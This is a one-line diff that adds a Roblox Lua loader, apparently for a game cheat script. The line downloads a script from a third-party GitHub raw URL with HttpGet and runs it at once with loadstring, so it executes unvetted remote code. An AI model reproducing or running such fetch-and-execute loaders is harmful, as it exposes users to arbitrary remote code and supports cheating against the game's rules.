@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AELua/Roblox-Scripts/Game-Scripts/coinscriptlol.txt",true))()
